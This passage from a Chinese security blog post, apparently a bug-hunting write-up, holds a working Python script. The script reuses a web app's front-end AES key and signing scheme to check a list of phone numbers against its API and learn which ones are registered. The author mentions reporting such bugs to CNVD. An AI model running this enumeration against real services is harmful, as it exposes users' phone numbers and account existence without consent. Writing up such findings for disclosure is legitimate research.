+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> urllib3
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+
+urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># aes的key和初始向量</span>
+key <span class="token operator">=</span> <span class="token string">'PHVDHENXNREOEVON'</span>
+vi <span class="token operator">=</span> <span class="token string">'1234567812345678'</span>
+url <span class="token operator">=</span> <span class="token string">""</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Sec-Ch-Ua"</span><span class="token punctuation">:</span> <span class="token string">"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\""</span><span class="token punctuation">,</span>
+           <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/plain, */*"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json;charset=UTF-8"</span><span class="token punctuation">,</span>
+           <span class="token string">"Sec-Ch-Ua-Mobile"</span><span class="token punctuation">:</span> <span class="token string">"?0"</span><span class="token punctuation">,</span>
+           <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"</span><span class="token punctuation">,</span>
+           <span class="token string">"Token"</span><span class="token punctuation">:</span> <span class="token string">"undefined"</span><span class="token punctuation">,</span> <span class="token string">"Sec-Ch-Ua-Platform"</span><span class="token punctuation">:</span> <span class="token string">"\"Windows\""</span><span class="token punctuation">,</span>
+           <span class="token string">"Sec-Fetch-Site"</span><span class="token punctuation">:</span> <span class="token string">"same-origin"</span><span class="token punctuation">,</span> <span class="token string">"Sec-Fetch-Mode"</span><span class="token punctuation">:</span> <span class="token string">"cors"</span><span class="token punctuation">,</span> <span class="token string">"Sec-Fetch-Dest"</span><span class="token punctuation">:</span> <span class="token string">"empty"</span><span class="token punctuation">,</span>
+           <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>
+           <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">def</span> <span class="token function">AES_Encrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> key
+    <span class="token keyword">global</span> vi
+    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> pad<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token comment"># 字符串补位</span>
+    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> vi<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    encryptedbytes <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token comment"># 加密后得到的是bytes类型的数据</span>
+    encodestrs <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encryptedbytes<span class="token punctuation">)</span>
+    <span class="token comment"># 使用Base64进行编码,返回byte字符串</span>
+    enctext <span class="token operator">=</span> encodestrs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+    <span class="token comment"># 对byte字符串按utf-8进行解码</span>
+    <span class="token keyword">return</span> enctext
+
+
+<span class="token keyword">def</span> <span class="token function">AES_Decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> key
+    <span class="token keyword">global</span> vi
+    data <span class="token operator">=</span> data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+    encodebytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>decodebytes<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token comment"># 将加密数据转换位bytes类型数据</span>
+    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> vi<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    text_decrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encodebytes<span class="token punctuation">)</span>
+    text_decrypted <span class="token operator">=</span> text_decrypted<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">b'\0'</span><span class="token punctuation">)</span>
+    <span class="token comment"># 去补位</span>
+    text_decrypted <span class="token operator">=</span> text_decrypted<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> text_decrypted
+
+
+<span class="token keyword">def</span> <span class="token function">sha256</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+phone_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test-phone.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>
+        phone_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> phone_list<span class="token punctuation">:</span>
+    requestsData <span class="token operator">=</span> AES_Encrypt<span class="token punctuation">(</span><span class="token string">'&#123;"phone":"%s","smsCode":""&#125;'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>
+    encodeKey <span class="token operator">=</span> <span class="token string">"lFd5OEc6BEDbh/KA/JiYNOG1xoQY3GgwS8HAjWAVUt19zxXEzjvtice8EZapgHY0HqyEUaZT6lLFTXHfmJ0qXLyPLVzf01yQ0UMIWYQOHPyDygm4JXW/7OBO1dpb3uTjo0MF0YO0U3+LF+LfNHvbqByeXgj1vmswlrNSQMmRgmw="</span>
+    sign_exp <span class="token operator">=</span> <span class="token string">'&#123;clientId=1, encodeKey=%s, requestData=%s, requestId=1, secret=test, timestamp=1&#125;'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>
+        encodeKey<span class="token punctuation">,</span> requestsData<span class="token punctuation">)</span>
+    sign <span class="token operator">=</span> sha256<span class="token punctuation">(</span>sign_exp<span class="token punctuation">)</span>
+    json <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"clientId"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
+            <span class="token string">"encodeKey"</span><span class="token punctuation">:</span> encodeKey<span class="token punctuation">,</span>
+            <span class="token string">"requestData"</span><span class="token punctuation">:</span> requestsData<span class="token punctuation">,</span> <span class="token string">"requestId"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
+            <span class="token string">"sign"</span><span class="token punctuation">:</span> sign<span class="token punctuation">,</span> <span class="token string">"timestamp"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span>
+    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> json<span class="token operator">=</span>json<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        result <span class="token operator">=</span> AES_Decrypt<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'该手机号未查询到用户'</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"未注册"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"查询到了："</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>代码中我保持<code>encodeKey</code>不变，这样意味着<code>AES KEY</code>不变，爆破代码就可以不用写RSA相关了。</p>
+<p>因为返回的值长这样，也是一个AES加密，所以写了个<code>AES_Decrypt</code>函数用于解密返回包。</p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316232124176.png"></p>
+<p><img src="/../images/%E6%8C%96%E6%B4%9E%E5%AE%9E%E6%88%98%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/image-20220316232136887.png"></p>
+<p>这种爆破手机号的洞我也尝试去投了两个到CNVD，一个归档一个驳回，打个信息泄露擦边球着实难以界定。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">巡璃</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://syunaht.com/p/2667916416.html">https://syunaht.com/p/2667916416.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">巡璃</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/JS%E9%80%86%E5%90%91/">
+                                    <span class="chip bg-color">JS逆向</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'DePPrTHvVtRAAg5I6xqTfarg-gzGzoHsz',
+        appKey: 'XjFNE6eco4UQkr4uh5WYk27C',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: '欢迎评论交流~'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/p/3625148018.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/47.jpg" class="responsive-img" alt="从外网打点到内网漫游-入门级靶场渗透笔记">
+                        
+                        <span class="card-title">从外网打点到内网漫游-入门级靶场渗透笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-02
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/p/3654935441.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/77.jpg" class="responsive-img" alt="Shiro550/Shiro721复现">
+                        
+                        <span class="card-title">Shiro550/Shiro721复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/SRC/" class="post-category">
+                                    SRC
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2016-4437/">
+                        <span class="chip bg-color">CVE-2016-4437</span>
+                    </a>
+                    
+                    <a href="/tags/Shiro/">
+                        <span class="chip bg-color">Shiro</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right" style="text-align: center;">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">巡璃</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2019";
+                        var startMonth = "12";
+                        var startDate = "1";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <!-- <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div> -->
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
